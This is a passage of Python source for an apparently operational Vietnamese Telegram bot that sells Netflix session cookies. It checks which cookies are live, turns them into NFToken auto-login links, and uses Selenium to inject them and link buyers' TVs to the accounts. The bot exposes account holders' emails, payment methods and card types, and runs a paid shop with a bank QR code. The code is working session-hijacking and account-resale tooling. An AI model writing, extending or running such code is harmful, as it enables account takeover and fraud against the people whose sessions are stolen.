        service = Service(executable_path=driver_path, log_path=os.path.devnull)
        driver = webdriver.Chrome(service=service, options=options)
        
        driver.get("https://www.netflix.com/vn-en/")
        time.sleep(2)
        for key, value in cookie_dict.items():
            try: driver.add_cookie({'name': key, 'value': value, 'domain': '.netflix.com', 'path': '/'})
            except: pass

        driver.get("https://www.netflix.com/tv8")
        time.sleep(3)
        
        if "login" in driver.current_url.lower():
            return False, "Cookie đã chết, bị đẩy về trang đăng nhập.", {}
            
        wait = WebDriverWait(driver, 15)
        
        code_input = wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, "input[name='code'], input[name='tvCode'], input[type='tel']")))
        code_input.clear()
        
        for char in tv_code:
            code_input.send_keys(char)
            time.sleep(0.05)
            
        time.sleep(1)
        
        try:
            submit_btn = driver.find_element(By.CSS_SELECTOR, "button[type='submit'], button[data-uia='tv8-submit-button'], button.btn-red")
            driver.execute_script("arguments[0].click();", submit_btn)
        except: pass
        
        try:
            submit_btn = driver.find_element(By.CSS_SELECTOR, "button[type='submit'], button.btn-red")
            ActionChains(driver).move_to_element(submit_btn).click().perform()
        except: pass

        try:
            code_input.send_keys(Keys.ENTER)
        except: pass
        
        time.sleep(12) 
        
        html = driver.page_source.lower()
        current_url = driver.current_url.lower()
        
        is_success = False
        has_error = any(e in html for e in ['mã không hợp lệ', 'invalid code', 'incorrect code', 'unable to link', 'mã không đúng', 'we were unable'])
        success_keywords = ['thiết bị của bạn đã được kết nối', 'is connected', 'thành công', 'đã kết nối']
        
        if any(u in current_url for u in ['tv8/success', '/browse', '/youraccount', 'switchprofile', 'profilesgate']):
            is_success = True
        elif any(s in html for s in success_keywords):
            is_success = True
        else:
            inputs = driver.find_elements(By.CSS_SELECTOR, "input[name='code'], input[name='tvCode']")
            if len(inputs) == 0:
                is_success = True
                
        if is_success:
            current_cookies = {ck['name']: ck['value'] for ck in driver.get_cookies()}
            account_info = checker.get_account_info(current_cookies)
            return True, "Thành công", account_info
        else:
            try: 
                body_text = driver.find_element(By.TAG_NAME, "body").text.replace('\n', ' ')[:100]
            except: 
                body_text = "Không đọc được chữ trên web"
                
            if has_error: 
                return False, f"Mã sai hoặc hết hạn. Web báo: {body_text}", {}
            else: 
                return False, f"Lỗi không bấm được nút gửi mã. Web báo: {body_text}", {}
            
    except Exception as e:
        return False, f"Lỗi hệ thống khi mở trình duyệt: {str(e)[:50]}", {}
    finally:
        if driver:
            try: driver.quit()
            except: pass
        try: shutil.rmtree(temp_dir, ignore_errors=True)
        except: pass

# ══════════════════════════════════════════
#  KEYBOARD LAYOUTS
# ══════════════════════════════════════════
def kb_main():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🛒 Cửa Hàng", callback_data='store_main'), InlineKeyboardButton("💸 Nạp Tiền", callback_data='deposit_main')],
        [InlineKeyboardButton("Lấy Cookie (Đã Mua)", callback_data='extract_vip'), InlineKeyboardButton("Tạo Link (Theo Gói)", callback_data='menu_chk')],
        [InlineKeyboardButton("📺 Đăng nhập TV (FREE)", callback_data='menu_tv_log'), InlineKeyboardButton("🎁 Điểm Danh", callback_data='menu_freecookie')],
        [InlineKeyboardButton("📜 Lịch Sử Gói", callback_data='purchase_history'), InlineKeyboardButton("📚 Hướng Dẫn", callback_data='menu_help')]
    ])

def kb_back(): return InlineKeyboardMarkup([[InlineKeyboardButton("🏡 Về Trang Chủ", callback_data='back_main')]])
def kb_cancel(): return InlineKeyboardMarkup([[InlineKeyboardButton("🛑 Dừng Tiến Trình", callback_data='cancel_task')]])
def kb_done(): return InlineKeyboardMarkup([[InlineKeyboardButton("🔁 Tạo Tiếp", callback_data='menu_chk'), InlineKeyboardButton("🏡 Trang Chủ", callback_data='back_main')]])
def kb_done_with_report(): return InlineKeyboardMarkup([[InlineKeyboardButton("⚠️ Báo Lỗi", callback_data='report_error')], [InlineKeyboardButton("🔁 Thực hiện tiếp", callback_data='menu_chk'), InlineKeyboardButton("🏡 Trang Chủ", callback_data='back_main')]])
def kb_proxy(): return InlineKeyboardMarkup([[InlineKeyboardButton("✏️ Đổi Proxy", callback_data='proxy_set'), InlineKeyboardButton("🔄 Tắt / Bật", callback_data='proxy_toggle')], [InlineKeyboardButton("🏡 Về Trang Chủ", callback_data='back_main')]])

def kb_admin():
    global MAINTENANCE_MODE
    mtn_text = "🛠 Tắt Bảo Trì" if MAINTENANCE_MODE else "🛠 Bật Bảo Trì"
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🍪 Thêm Cookie Mới", callback_data='admin_choose_add_type'), InlineKeyboardButton("📦 Kho Cookie", callback_data='admin_cookie_inventory')],
        [InlineKeyboardButton("🎧 Lấy Cookie Spotify", callback_data='admin_get_spotify')],
        [InlineKeyboardButton(mtn_text, callback_data='admin_toggle_mtn'), InlineKeyboardButton("📢 Gửi Thông Báo", callback_data='admin_broadcast')],
        [InlineKeyboardButton("🎟 Tạo Mã Khuyến Mãi", callback_data='admin_add_discount'), InlineKeyboardButton("✏️ Đổi Gói", callback_data='admin_setplan')],
        [InlineKeyboardButton("🔒 Khóa User", callback_data='admin_ban_user'), InlineKeyboardButton("🔓 Mở Khóa User", callback_data='admin_unban_user')],
        [InlineKeyboardButton("👥 DS Người Dùng", callback_data='admin_list_users'), InlineKeyboardButton("🚫 DS Bị Khóa", callback_data='admin_list_banned')],
        [InlineKeyboardButton("➕ Tạo Gói", callback_data='admin_addplan'), InlineKeyboardButton("🛒 Thêm Gói CH", callback_data='admin_addstore')],
        [InlineKeyboardButton("🗑 Xóa Gói CH", callback_data='admin_delstore'), InlineKeyboardButton("🔍 Tra cứu HĐ", callback_data='admin_lookup_bill')],
        [InlineKeyboardButton("🏡 Đóng", callback_data='back_main')]
    ])

# ══════════════════════════════════════════
#  COMMAND HANDLERS
# ══════════════════════════════════════════
async def cmd_baoloi(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_user_status(update, context): return
    try: await update.message.delete()
    except: pass
    text = (
        f"⚠️ *BÁO LỖI / LIÊN HỆ ADMIN*\n\n"
        f"Vui lòng nhắn tin mô tả chi tiết lỗi bạn gặp phải hoặc gửi kèm hình ảnh chụp màn hình vào đây.\n"
        f"Hệ thống sẽ chuyển báo cáo của bạn đến Admin, hoặc bạn có thể nhắn thẳng cho Telegram: `@mnhutdznecon`."
    )
    await context.bot.send_message(chat_id=update.effective_chat.id, text=text, parse_mode='Markdown', reply_markup=kb_back())
    context.user_data['awaiting'] = 'report_error'

async def cmd_giftcode(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_user_status(update, context): return
    try: await update.message.delete()
    except: pass
    user_id = update.effective_user.id
    if not context.args:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="🎟 Vui lòng nhập mã. Ví dụ: `/giftcode SALE50K`", parse_mode='Markdown')
        return
    code = context.args[0]
    success, msg = use_discount_code(code, user_id)
    if success: await context.bot.send_message(chat_id=update.effective_chat.id, text=f"🎉 Chúc mừng! Bạn đã nhận được *{msg:,.0f}đ* vào số dư.", parse_mode='Markdown')
    else: await context.bot.send_message(chat_id=update.effective_chat.id, text=f"❌ {msg}")

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_user_status(update, context): return
    try: await update.message.delete()
    except: pass
    user = update.effective_user
    name = user.first_name.replace("_", "").replace("*", "").replace("`", "").replace("[", "") if user and user.first_name else "bạn"
    get_user(user.id, user.username)
    balance, credits = get_user_economy(user.id)
    await context.bot.send_message(chat_id=update.effective_chat.id, text=banner_main(user.id, name, balance, credits), parse_mode='Markdown', reply_markup=kb_main())

async def cmd_me(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_user_status(update, context): return
    try: await update.message.delete()
    except: pass
    user = update.effective_user
    tokens_used, tokens_max, cookies_used, cookies_max, plan_name = get_user_quota(user.id)
    text = (
        f"👤 *Thông tin Tài Khoản*\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"🔹 **ID:** `{user.id}`\n"
        f"🔹 **Gói cước:** `{plan_name}`\n\n"
        f"🔋 **Giới hạn hôm nay:**\n"
        f"  • Tạo link: {tokens_used}/{tokens_max if tokens_max < 99999 else 'Vô hạn'}\n"
        f"  • Cookie Free: {cookies_used}/{cookies_max if cookies_max < 99999 else 'Vô hạn'}\n"
        f"━━━━━━━━━━━━━━━━━━"
    )
    await context.bot.send_message(chat_id=update.effective_chat.id, text=text, parse_mode='Markdown')

async def cmd_freecookie(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_user_status(update, context): return
    try: await update.message.delete()
    except: pass
    user = update.effective_user
    tokens_used, tokens_max, cookies_used, cookies_max, plan_name = get_user_quota(user.id)
    if cookies_used >= cookies_max:
        await context.bot.send_message(chat_id=update.effective_chat.id, text=f"❌ Bạn đã hết lượt nhận Cookie Free hôm nay. Hãy nâng cấp gói cước để nhận thêm nhé.")
        return
    cookie_data = claim_free_cookie(user.id)
    if not cookie_data:
        await context.bot.send_message(chat_id=update.effective_chat.id, text=f"😔 Rất tiếc, kho Cookie Free hiện tại đang trống. Vui lòng quay lại sau!")
        return
    await context.bot.send_message(chat_id=update.effective_chat.id, text=f"🎁 *COOKIE FREE CỦA BẠN*\n━━━━━━━━━━━━━━━━━━\n`{cookie_data}`\n━━━━━━━━━━━━━━━━━━\n💡 Lượt nhận còn lại hôm nay: {cookies_max - cookies_used - 1}", parse_mode='Markdown')

async def cmd_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_user_status(update, context): return
    try: await update.message.delete()
    except: pass
    user = update.effective_user
    if user.id != ADMIN_ID: return
    total, active, tokens, avail, used = get_stats()
    text = (
        f"👑 *ADMIN DASHBOARD*\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"👥 Tổng User: {total}\n"
        f"🟢 Active hôm nay: {active}\n"
        f"🔗 Tổng Link tạo: {tokens}\n"
        f"🎁 Kho Cookie: {avail} (đã phát: {used})\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"👉 Chọn tính năng quản lý bên dưới:"
    )
    await context.bot.send_message(chat_id=update.effective_chat.id, text=text, parse_mode='Markdown', reply_markup=kb_admin())

async def cmd_setplan(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    try: await update.message.delete()
    except: pass
    args = context.args
    if len(args) < 2:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="❌ Lỗi: `/setplan <user_id> <plan_name>`", parse_mode='Markdown')
        return
    if set_plan(args[0], args[1].upper()): await context.bot.send_message(chat_id=update.effective_chat.id, text=f"✅ Đã set user `{args[0]}` lên gói `{args[1].upper()}`", parse_mode='Markdown')
    else: await context.bot.send_message(chat_id=update.effective_chat.id, text="❌ Gói cước không tồn tại!")

async def cmd_addplan(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    try: await update.message.delete()
    except: pass
    args = context.args
    if len(args) < 3:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="❌ Lỗi: `/addplan <tên> <link/ngày> <cookie/ngày>`", parse_mode='Markdown')
        return
    add_plan(args[0].upper(), int(args[1]), int(args[2]))
    await context.bot.send_message(chat_id=update.effective_chat.id, text=f"✅ Đã thêm/cập nhật cấu hình gói `{args[0].upper()}`\n\n💡 _Lưu ý: Để hiển thị gói này trong Cửa hàng, hãy dùng lệnh /addstore_", parse_mode='Markdown')

async def cmd_addcookie(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    try: await update.message.delete()
    except: pass
    cookie = " ".join(context.args)
    if not cookie:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="❌ Lỗi: `/addcookie <chuỗi cookie>`", parse_mode='Markdown')
        return
    add_free_cookie(cookie)
    await context.bot.send_message(chat_id=update.effective_chat.id, text="✅ Đã thêm vào kho Cookie Free!")

async def cmd_broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    try: await update.message.delete()
    except: pass
    msg = " ".join(context.args)
    if not msg:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="❌ Lỗi: `/broadcast <nội dung>`", parse_mode='Markdown')
        return
    conn = get_connection()
    c = conn.cursor()
    c.execute("SELECT user_id FROM users")
    users = c.fetchall()
    conn.close()
    success = 0
    await context.bot.send_message(chat_id=update.effective_chat.id, text=f"Đang gửi tới {len(users)} users...")
    for u in users:
        try:
            await context.bot.send_message(chat_id=u[0], text=f"📢 *THÔNG BÁO TỪ ADMIN*\n\n{msg}", parse_mode='Markdown')
            success += 1
            await asyncio.sleep(0.05)
        except: pass
    await context.bot.send_message(chat_id=update.effective_chat.id, text=f"✅ Đã gửi thành công: {success}/{len(users)}")

# ══════════════════════════════════════════
#  BUTTON HANDLER
# ══════════════════════════════════════════
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_user_status(update, context): return
    query = update.callback_query
    await query.answer()
    user = update.effective_user
    name = user.first_name.replace("_", "").replace("*", "").replace("`", "").replace("[", "") if user and user.first_name else "bạn"

    if query.data == 'menu_tv_log':
        avail = get_premium_cookie_count()
        if avail == 0:
            await query.edit_message_text("❌ *Kho hiện tại đã hết cookie!* Vui lòng thử lại sau.", parse_mode='Markdown', reply_markup=kb_back())
            return
        text = (
            f"📺 *ĐĂNG NHẬP NETFLIX TRÊN TV (FREE VÔ HẠN)*\n"
            f"{DIVIDER}\n\n"
            f"1️⃣ Mở ứng dụng Netflix trên TV của bạn.\n"
            f"2️⃣ Chọn mục **Đăng nhập từ trang web** (Sign in from Web).\n"
            f"3️⃣ Nhập mã số gồm 8 ký tự hiển thị trên TV vào đây.\n\n"
            f"👉 *Ví dụ:* `1234 5678` hoặc `12345678`\n\n"
            f"💡 _Chức năng này không giới hạn lượt và hoàn toàn miễn phí!_"
        )
        await query.edit_message_text(text, parse_mode='Markdown', reply_markup=kb_back())
        context.user_data['awaiting'] = 'tv_code'

    elif query.data == 'menu_chk':
        tokens_used, tokens_max, cookies_used, cookies_max, plan_name = get_user_quota(user.id)
        if tokens_used >= tokens_max:
            await query.edit_message_text(f"❌ *Bạn đã hết lượt tạo link hôm nay ({tokens_max}/{tokens_max})*.\nHãy liên hệ Admin hoặc vào Cửa Hàng để nâng cấp gói cước nhé!", parse_mode='Markdown', reply_markup=kb_back())
            return
        avail = get_premium_cookie_count()
        if avail == 0:
            await query.edit_message_text("❌ *Kho hiện tại đã hết cookie!* Vui lòng thử lại sau hoặc báo Admin.", parse_mode='Markdown', reply_markup=kb_back())
            return
            
        status_msg = await query.edit_message_text(f"⏳ *Đang tự động lấy Cookie ngẫu nhiên từ Kho...*\n\n  Vui lòng chờ giây lát...", parse_mode='Markdown')
        success, attempts, max_attempts = False, 0, 5
        final_token, final_account, final_c_dict = None, None, None
        
        while attempts < max_attempts and not success:
            attempts += 1
            try: await status_msg.edit_text(f"⏳ *Đang test tài khoản (Lần {attempts}/{max_attempts})...*", parse_mode='Markdown')
            except: pass
            cookies = pop_premium_cookies(1, user.id)
            if not cookies: break
            c_id, c_data = cookies[0]
            c_dict_list = checker.extract_cookies_from_text(c_data)
            if not c_dict_list:
                delete_premium_cookie(c_id) 
                continue
            c_dict = c_dict_list[0]
            succ, token, error, account = await asyncio.to_thread(checker.check_cookie, c_dict)
            if succ and token:
                mem_status = account.get('membership_status', 'N/A')
                if mem_status != 'CURRENT_MEMBER':
                    delete_premium_cookie(c_id) 
                    continue
                success, final_token, final_account, final_c_dict = True, token, account, c_dict
                break
            else: 
                if not succ or not token or account.get('membership_status') in ('FORMER_MEMBER', 'ON HOLD'):
                    delete_premium_cookie(c_id)
                else:
                    return_premium_cookie(c_id)
                
        if success:
            add_token_usage(user.id, 1)
            link = checker.format_nftoken_link(final_token)
            card = format_account_card(final_account, link)
            await status_msg.edit_text(card, parse_mode='Markdown', disable_web_page_preview=True, reply_markup=kb_done_with_report())
            email = final_account.get('email', 'NoEmail')
            email_clean = re.sub(r'[^\w\-_]', '', email.split('@')[0]) if email != 'N/A' and '@' in email else 'NoEmail'
            plan_clean = re.sub(r'[^\w\-_]', '', final_account.get('plan', 'NoPlan').replace(' ', '_'))
            country_clean = re.sub(r'[^\w\-_]', '', final_account.get('country', 'XX'))
            filename = f"NF_{email_clean}_{plan_clean}_{country_clean}.txt"
            file_content = (
                f"# ══════════════════════════════════════\n#  NETFLIX COOKIE + NFTOKEN\n#  Generated by {BOT_NAME} v{BOT_VERSION}\n#  {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n# ══════════════════════════════════════\n#\n"
                f"# Email:      {final_account.get('email', 'N/A')}\n# Plan:       {final_account.get('plan', 'N/A')}\n# Country:    {final_account.get('country', 'N/A')}\n# Payment:    {final_account.get('payment_method', 'N/A')}\n# CC Type:    {final_account.get('cc_type', 'N/A')}\n# Streams:    {final_account.get('max_streams', 'N/A')}\n#\n"
                f"# Auto Login Link:\n{link}\n#\n# ══════════════════════════════════════\n\n{checker.build_netscape_format(final_c_dict)}"
            )
            await context.bot.send_document(chat_id=query.message.chat_id, document=io.BytesIO(file_content.encode('utf-8')), filename=filename, reply_markup=kb_done())
        else: await status_msg.edit_text("❌ Rất tiếc, các cookie trong kho hiện đang lỗi hoặc hết hạn. Hãy báo Admin nhé!", reply_markup=kb_back())

    elif query.data == 'menu_plan':
        tokens_used, tokens_max, cookies_used, cookies_max, plan_name = get_user_quota(user.id)
        text = f"👤 *Thông tin Tài Khoản*\n━━━━━━━━━━━━━━━━━━\n🔹 **ID:** `{user.id}`\n🔹 **Gói cước:** `{plan_name}`\n\n🔋 **Giới hạn hôm nay:**\n  • Tạo link: {tokens_used}/{tokens_max if tokens_max < 99999 else 'Vô hạn'}\n  • Cookie Free: {cookies_used}/{cookies_max if cookies_max < 99999 else 'Vô hạn'}\n━━━━━━━━━━━━━━━━━━"
        await query.edit_message_text(text, parse_mode='Markdown', reply_markup=kb_back())

    elif query.data == 'menu_freecookie':
        tokens_used, tokens_max, cookies_used, cookies_max, plan_name = get_user_quota(user.id)
        if cookies_used >= cookies_max: text = f"❌ Bạn đã hết lượt nhận Cookie Free hôm nay. Hãy nâng cấp gói cước để nhận thêm nhé."
        else:
            cookie_data = claim_free_cookie(user.id)
            if not cookie_data: text = f"😔 Rất tiếc, kho Cookie Free hiện tại đang trống. Vui lòng quay lại sau!"
            else: text = f"🎁 *COOKIE FREE CỦA BẠN*\n━━━━━━━━━━━━━━━━━━\n`{cookie_data}`\n━━━━━━━━━━━━━━━━━━\n💡 Lượt nhận còn lại hôm nay: {cookies_max - cookies_used - 1}"
        await query.edit_message_text(text, parse_mode='Markdown', reply_markup=kb_back())

    elif query.data == 'menu_proxy':
        icon = proxy_manager.get_status_icon()
        text = f"{LOGO}  ›  *Cài đặt Proxy*\n{DIVIDER}\n\n  {icon}  Trạng thái:  {proxy_manager.get_status_text()}\n\n{DIVIDER_THIN}\n{FOOTER}"
        await query.edit_message_text(text, parse_mode='Markdown', reply_markup=kb_proxy())

    elif query.data == 'store_main':
        items = get_store_items()
        text = f"🛒 *CỬA HÀNG COOKIE VIP*\n{DIVIDER}\n\nMua lượt rút Cookie Premium bằng Số dư của bạn.\nSố dư hiện tại: *{get_user_economy(user.id)[0]:,.0f}đ*\n\nChọn gói bên dưới để mua:"
        buttons = [[InlineKeyboardButton(f"🎁 {it[1]} ({it[3]} lượt) - {it[2]:,.0f}đ", callback_data=f'store_buy_{it[0]}')] for it in items]
        buttons.append([InlineKeyboardButton("🏡 Về Trang Chủ", callback_data='back_main')])
        await query.edit_message_text(text, parse_mode='Markdown', reply_markup=InlineKeyboardMarkup(buttons))

    elif query.data.startswith('store_buy_'):
        item_id = int(query.data.split('_')[2])
        item = get_store_item(item_id)
        if not item:
            await query.answer("Gói không tồn tại!")
            return
        success = deduct_balance(user.id, item[2])
        if success:
            add_credits(user.id, item[3])
            tx_id = add_purchase_history(user.id, item[1], item[2])
            set_plan(user.id, item[1].upper())
            await query.answer(f"✅ Mua thành công {item[1]}!", show_alert=True)
            
            admin_text = f"🛍 *ĐƠN HÀNG MỚI*\n\n👤 User ID: `{user.id}`\n📦 Tên Gói: `{item[1]}`\n💰 Giá: `{item[2]:,.0f}đ`\n🧾 Mã hóa đơn: `#{tx_id}`"
            try: await context.bot.send_message(chat_id=ADMIN_ID, text=admin_text, parse_mode='Markdown', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("💬 Nhắn tin cho Khách", callback_data=f"admin_reply_{user.id}")]]))
            except: pass

            items = get_store_items()
            text = f"🛒 *CỬA HÀNG COOKIE VIP*\n{DIVIDER}\n\n✅ *Đã mua thành công gói {item[1]}*\nSố dư hiện tại: *{get_user_economy(user.id)[0]:,.0f}đ*\n\n"
            buttons = [[InlineKeyboardButton(f"🎁 {it[1]} ({it[3]} lượt) - {it[2]:,.0f}đ", callback_data=f'store_buy_{it[0]}')] for it in items]
            buttons.append([InlineKeyboardButton("⚠️ Báo Lỗi", callback_data='report_error'), InlineKeyboardButton("🏡 Về Trang Chủ", callback_data='back_main')])
            await query.edit_message_text(text, parse_mode='Markdown', reply_markup=InlineKeyboardMarkup(buttons))
        else:
            await query.answer("Số dư không đủ! Đang tạo mã QR...", show_alert=False)
            missing = item[2]
            url = f"https://img.vietqr.io/image/MB-17363999999999-compact2.png?amount={missing}&addInfo=NAP%20{user.id}&accountName=BUI%20MINH%20NHUT"
            caption = f"❌ *Số dư không đủ!*\n\nVui lòng quét mã QR bên dưới để nạp đủ *{missing:,.0f}đ* mua gói này.\nNội dung CK: `NAP {user.id}`\n\nSau khi chuyển khoản, bấm nút *Đã Chuyển Khoản* bên dưới để gửi Bill."
            markup = InlineKeyboardMarkup([[InlineKeyboardButton("✅ Đã Chuyển Khoản", callback_data=f"deposit_submit_bill_{missing}")], [InlineKeyboardButton("🏡 Đóng", callback_data="back_main")]])
            await query.message.reply_photo(photo=url, caption=caption, parse_mode='Markdown', reply_markup=markup)

    elif query.data == 'report_error':
        await query.edit_message_text(
            f"⚠️ *BÁO LỖI / LIÊN HỆ ADMIN*\n\n"
            f"Vui lòng nhắn tin mô tả chi tiết lỗi bạn gặp phải hoặc gửi kèm hình ảnh chụp màn hình.\n"
            f"Hệ thống sẽ chuyển báo cáo của bạn đến Admin, hoặc bạn có thể nhắn thẳng cho Telegram: `@mnhutdznecon`.",
            parse_mode='Markdown', reply_markup=kb_back()
        )
        context.user_data['awaiting'] = 'report_error'

    elif query.data == 'report_cookie_error':
        try:
            original_text = query.message.text or '(Không có nội dung)'
            admin_text = f"⚠️ *BÁO LỖI COOKIE TỪ KHÁCH*\n\n👤 User: `{user.id}` ({name})\n📅 Thời gian: `{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`\n\n📝 Nội dung cookie đã gửi:\n{original_text[:1500]}"
            admin_markup = InlineKeyboardMarkup([[InlineKeyboardButton("💬 Trả lời Khách", callback_data=f"admin_reply_{user.id}")]])
            await context.bot.send_message(chat_id=ADMIN_ID, text=admin_text, parse_mode='Markdown', reply_markup=admin_markup)
            await query.answer("✅ Đã báo lỗi đến Admin! Cảm ơn bạn.", show_alert=True)
        except Exception:
            await query.answer("❌ Gửi báo lỗi thất bại, vui lòng thử lại.", show_alert=True)

    elif query.data == 'deposit_main':
        await query.edit_message_text(f"💰 *NẠP TIỀN VÀO TÀI KHOẢN*\n\nVui lòng nhắn tin *số tiền* bạn muốn nạp (VD: `50000`).\nHệ thống sẽ tạo mã QR thanh toán tự động cho bạn.", parse_mode='Markdown', reply_markup=kb_back())
        context.user_data['awaiting'] = 'deposit_enter_amount'

    elif query.data.startswith('deposit_submit_bill_'):
        amt = query.data.split('_')[3]
        await query.edit_message_caption(caption=f"✅ *Đã xác nhận thanh toán {int(amt):,.0f}đ*\n\nVui lòng nhắn tin gửi kèm hình ảnh Bill (biên lai) để Admin duyệt nạp tiền.", parse_mode='Markdown')
        context.user_data['awaiting'] = f'deposit_bill_{amt}'

    elif query.data.startswith('admin_approve_tx_'):
        if user.id != ADMIN_ID: return
        tx_id = int(query.data.split('_')[3])
        success, uid, amount = approve_transaction(tx_id)
        if success:
            await query.edit_message_text(f"✅ Đã duyệt giao dịch #{tx_id} thành công!", parse_mode='Markdown')
            try: await context.bot.send_message(chat_id=uid, text=f"✅ *NẠP TIỀN THÀNH CÔNG*\n\nTài khoản của bạn đã được cộng thêm *{amount:,.0f}đ* từ giao dịch `#{tx_id}`.", parse_mode='Markdown')
            except: pass
        else:
            await query.edit_message_text(f"❌ Giao dịch #{tx_id} không tồn tại hoặc đã được xử lý.", parse_mode='Markdown')

    elif query.data.startswith('admin_reject_tx_'):
        if user.id != ADMIN_ID: return
        tx_id = int(query.data.split('_')[3])
        uid = reject_transaction(tx_id)
        await query.edit_message_text(f"🚫 Đã từ chối giao dịch #{tx_id}.", parse_mode='Markdown')
        if uid:
            try:
                reject_msg = (f"❌ *NẠP TIỀN THẤT BẠI*\n\nGiao dịch `#{tx_id}` của bạn đã bị từ chối.\n\n"
                              f"Nếu có sai sót, vui lòng dùng lệnh `/baoloi` hoặc nhắn thẳng cho Telegram: `@mnhutdznecon` để được hỗ trợ.")
                await context.bot.send_message(chat_id=uid, text=reject_msg, parse_mode='Markdown')
            except: pass

    elif query.data.startswith('admin_reply_'):
        if user.id != ADMIN_ID: return
        target_uid = query.data.split('_')[2]
        await query.message.reply_text(f"📝 Nhập nội dung tin nhắn để gửi cho User `{target_uid}`:")
        context.user_data['awaiting'] = f'admin_send_reply_{target_uid}'

    elif query.data == 'admin_lookup_bill':
        if user.id != ADMIN_ID: return
        await query.edit_message_text("🔍 *TRA CỨU HÓA ĐƠN MUA GÓI*\n\nVui lòng nhắn tin *Mã hóa đơn* (ID) bạn muốn kiểm tra (Ví dụ: `12`).", parse_mode='Markdown', reply_markup=kb_admin())
        context.user_data['awaiting'] = 'admin_lookup_bill'

    elif query.data == 'extract_vip':
        bal, cred = get_user_economy(user.id)
        text = f"🚀 *LẤY COOKIE (ĐÃ MUA)*\n{DIVIDER}\n\n💎 Bạn đang có: *{cred}* lượt lấy cookie.\n\nVui lòng nhắn tin *số lượng* cookie bạn muốn lấy (VD: `5`).\nHệ thống sẽ tự động lọc cookie sống và trả về Link NFToken cho bạn."
        await query.edit_message_text(text, parse_mode='Markdown', reply_markup=kb_back())
        context.user_data['awaiting'] = 'extract_vip_count'

    elif query.data == 'purchase_history':
        history = get_purchase_history(user.id)
        if not history: text = "📜 *LỊCH SỬ MUA GÓI*\n\nBạn chưa mua gói nào."
        else:
            text = "📜 *LỊCH SỬ MUA GÓI*\n\n"
            for h in history[:10]:
                date_str = h[2].split('.')[0]
                text += f"🔹 *{h[0]}* - {h[1]:,.0f}đ\n🕒 `{date_str}`\n\n"
            if len(history) > 10: text += "... và các giao dịch cũ hơn."
        await query.edit_message_text(text, parse_mode='Markdown', reply_markup=kb_back())

    elif query.data == 'menu_stats':
        uid = update.effective_user.id if update.effective_user else 0
        stats = get_user_stats(uid)
        total = stats['total']
        success = stats['success']
        rate = round(success / total * 100, 1) if total > 0 else 0
        ep_host = API_ENDPOINTS[checker.last_working_endpoint].split('//')[1].split('/')[0]
        text = f"{LOGO}  ›  *Thống kê*\n{DIVIDER}\n\n  👤 *{name}*\n\n  📋 Đã kiểm tra:     *{total}*\n  ✅ Thành công:       *{success}*\n  📈 Tỷ lệ:               *{rate}%*\n\n  {DIVIDER_THIN}\n\n  🔗 Endpoint:  `{ep_host}`\n  📡 Endpoints:  *{len(API_ENDPOINTS)}*\n  🌐 Proxy:        {proxy_manager.get_status_icon()} {proxy_manager.get_status_text()}\n\n  {DIVIDER_THIN}\n  {FOOTER}"
        await query.edit_message_text(text, parse_mode='Markdown', reply_markup=kb_back())

    elif query.data == 'menu_help':
        text = f"{LOGO}  ›  *Hướng dẫn*\n{DIVIDER}\n\n*1. Cửa hàng & Nạp tiền:*\n   Nạp tiền vào Số dư để mua các\n   gói Lượt Rút Cookie chất lượng.\n\n*2. Rút Cookie VIP:*\n   Trích xuất tự động cookie sống\n   từ kho thành NFToken.\n\n*3. Đăng nhập TV:*\n   Liên kết TV qua mã 8 ký tự,\n   miễn phí và không giới hạn.\n\n  {DIVIDER_THIN}\n  {FOOTER}"
        await query.edit_message_text(text, parse_mode='Markdown', reply_markup=kb_back())

    elif query.data == 'admin_setplan':
        if user.id != ADMIN_ID: return
        await query.edit_message_text("✏️ *ĐỔI GÓI CƯỚC*\n\nVui lòng nhắn tin theo cú pháp:\n`<user_id> <tên_gói>`\n\nVí dụ: `123456789 VIP`", parse_mode='Markdown', reply_markup=kb_admin())
        context.user_data['awaiting'] = 'admin_setplan'

    elif query.data == 'admin_addplan':
        if user.id != ADMIN_ID: return
        await query.edit_message_text("➕ *TẠO GÓI MỚI*\n\nVui lòng nhắn tin theo cú pháp:\n`<tên_gói> <lượt_tạo_link> <lượt_nhận_cookie>`\n\nVí dụ: `PRO 999 5`", parse_mode='Markdown', reply_markup=kb_admin())
        context.user_data['awaiting'] = 'admin_addplan'

    elif query.data == 'admin_addstore':
        if user.id != ADMIN_ID: return
        await query.edit_message_text("🛒 *THÊM GÓI VÀO CỬA HÀNG*\n\nVui lòng nhắn tin theo cú pháp:\n`<tên_gói> <giá> <lượt_rút_cookie>`\n\nVí dụ: `VIP1 20000 10`\n\n⚠️ Tên gói phải đã tồn tại.", parse_mode='Markdown', reply_markup=kb_admin())
        context.user_data['awaiting'] = 'admin_addstore'

    elif query.data == 'admin_delstore':
        if user.id != ADMIN_ID: return
        items = get_store_items()
        if not items:
            await query.edit_message_text("❌ Cửa hàng hiện đang trống, không có gói nào để xóa.", reply_markup=kb_admin())
            return
